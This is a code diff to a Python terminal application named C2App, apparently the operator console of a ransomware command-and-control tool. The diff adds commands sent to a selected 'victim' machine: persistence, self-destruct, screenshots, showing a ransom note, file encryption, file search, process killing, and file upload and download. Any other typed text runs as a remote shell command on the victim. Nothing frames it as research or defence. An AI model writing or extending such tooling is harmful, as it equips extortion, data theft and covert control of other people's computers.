@@ -1,5 +1,4 @@
 import threading
-import datetime
 
 from textual.app import App, ComposeResult
 from textual.screen import Screen
@@ -50,7 +49,7 @@ class LoginScreen(Screen):
         success = self.client.setup(pw) if self.client.needs_setup else self.client.login(pw)
         if success:
             self.app.pop_screen()
-            self.app.push_screen('dashboard')
+            self.app.push_screen(DashboardScreen(self.client))
         else:
             msg = 'Setup failed' if self.client.needs_setup else 'Invalid password'
             self.query_one('#login-error', Label).update(f'[#ff6b6b]{msg}[/]')
@@ -87,12 +86,16 @@ class DashboardScreen(Screen):
 
     def on_mount(self):
         self.client.on_update = self._handle_event
+        self.client.load_full_state()
         self._refresh_all()
         if not self.client.connected:
             threading.Thread(target=self.client.connect, daemon=True).start()
 
     def _handle_event(self, event, *args):
-        self.app.call_from_thread(self._refresh_all)
+        try:
+            self.app.call_from_thread(self._refresh_all)
+        except Exception:
+            pass
 
     def _refresh_all(self):
         for w in self.query(HeaderWidget):
@@ -108,6 +111,16 @@ class DashboardScreen(Screen):
         for w in self.query(AlertsPanelWidget):
             w.refresh_content()
 
+    NO_ARG_COMMANDS = {
+        'persist', 'status', 'self_destruct', 'screenshot',
+        'show_ransomnote', 'network_info', 'pslist', 'list_plugins',
+        'encrypt', 'decrypt', 'scare', 'find_files',
+    }
+
+    ARG_COMMANDS = {
+        'pskill', 'download', 'upload',
+    }
+
     def on_input_submitted(self, event: Input.Submitted):
         text = event.value.strip()
         if not text or event.input.id == 'password-input':
@@ -119,8 +132,11 @@ class DashboardScreen(Screen):
         arg = parts[1] if len(parts) > 1 else ''
 
         if cmd == 'help':
-            self._log('Commands: exec <cmd>, l <plugin>, u <plugin>, plugins, alerts, q')
-        elif cmd == 'exit' or cmd == 'q':
+            self._log('Commands: persist, status, self_destruct, screenshot, show_ransomnote,')
+            self._log('  network_info, pslist, pskill <name>, download <file>, upload <file>,')
+            self._log('  exec <cmd>, encrypt, decrypt, l <plugin>, u <plugin>, find_files,')
+            self._log('  scare, plugins, alerts, q')
+        elif cmd in ('exit', 'q'):
             self.app.quit()
         elif cmd == 'plugins':
             self.client.fetch_plugins()
@@ -131,6 +147,24 @@ class DashboardScreen(Screen):
             self.client.fetch_alert_log()
             for w in self.query(AlertsPanelWidget):
                 w.refresh_content()
+        elif cmd == 'exec' and arg:
+            if hostname:
+                self.client.send_command(hostname, 'exec', {'cmd': arg})
+                self._log(f'exec → {hostname}: {arg}')
+            else:
+                self._log('[#ff6b6b]No victim selected[/]')
+        elif cmd in self.NO_ARG_COMMANDS:
+            if hostname:
+                self.client.send_command(hostname, cmd, {})
+                self._log(f'{cmd} → {hostname}')
+            else:
+                self._log('[#ff6b6b]No victim selected[/]')
+        elif cmd in self.ARG_COMMANDS and arg:
+            if hostname:
+                self.client.send_command(hostname, cmd, {'name': arg})
+                self._log(f'{cmd} {arg} → {hostname}')
+            else:
+                self._log('[#ff6b6b]No victim selected[/]')
         elif cmd == 'l' and arg:
             if hostname:
                 self.client.send_command(hostname, 'load_plugin', {'plugin_name': arg})
@@ -143,21 +177,13 @@ class DashboardScreen(Screen):
                 self._log(f'unload_plugin {arg} → {hostname}')
             else:
                 self._log('[#ff6b6b]No victim selected[/]')
-        elif cmd == 'exec' and arg:
-            if hostname:
-                self.client.send_command(hostname, 'exec', {'cmd': arg})
-                self._log(f'exec → {hostname}: {arg}')
-            else:
-                self._log('[#ff6b6b]No victim selected[/]')
+        elif cmd in self.ARG_COMMANDS and not arg:
+            self._log(f'[#ff6b6b]Usage: {cmd} <name>[/]')
+        elif not hostname:
+            self._log('[#ff6b6b]No victim selected[/]')
         else:
-            if hostname:
-                self.client.send_command(hostname, 'exec', {'cmd': text})
-                self._log(f'exec → {hostname}: {text}')
-            else:
-                self._log('[#ff6b6b]No victim selected[/]')
-
-        for w in self.query(CommandLogWidget):
-            w.refresh_content()
+            self.client.send_command(hostname, 'exec', {'cmd': text})
+            self._log(f'exec → {hostname}: {text}')
 
     def action_encrypt(self):
         hostname = self.client.selected_hostname
@@ -194,9 +220,13 @@ class DashboardScreen(Screen):
 
     def _log(self, msg):
         from datetime import datetime as dt
-        cl = self.query_one(CommandLogWidget)
         now = dt.now().strftime('%H:%M:%S')
-        cl.write(f'[#6e7681]{now}[/] {msg}')
+        self.client.logs.insert(0, {
+            'timestamp': now, 'command': 'CLI',
+            'hostname': 'local', 'result': msg,
+        })
+        cl = self.query_one(CommandLogWidget)
+        cl.refresh_content()
         cl.scroll_end()
 
 
@@ -222,9 +252,16 @@ class C2App(App):
         height: 1fr;
     }
     DetailPanel {
-        height: 14;
+        height: auto;
         border: solid #2d2d3d;
         margin: 0 0 1 0;
+    }
+    #detail-info {
+        height: auto;
+    }
+    #command-buttons {
+        height: auto;
+        padding: 0 0 0 1;
     }
     CommandLogWidget {
         height: 1fr;
